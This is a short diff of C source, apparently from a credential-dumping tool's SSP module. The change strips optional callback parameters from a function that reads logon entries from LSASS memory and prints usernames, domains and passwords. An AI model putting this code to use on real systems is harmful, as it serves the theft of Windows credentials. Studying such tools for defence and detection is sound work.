@@ -28,10 +28,10 @@ const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_ssp_single_package[] = {&kuhl_m_s
 
 NTSTATUS kuhl_m_sekurlsa_ssp(int argc, wchar_t * argv[])
 {
-	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_ssp_single_package, 1, NULL, NULL);
+	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_ssp_single_package, 1);
 }
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
 	KIWI_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
 	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
@@ -51,7 +51,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LO
 					if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.credentials.UserName.Buffer || mesCredentials.credentials.Domaine.Buffer || mesCredentials.credentials.Password.Buffer))
 					{
 						kprintf(L"\n\t [%08x]", monNb++);
-						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN, externalCallback, externalCallbackData);
+						kuhl_m_sekurlsa_genericCredsOutput(&mesCredentials.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
 					}
 					aLsass.address = mesCredentials.Flink;
 				}
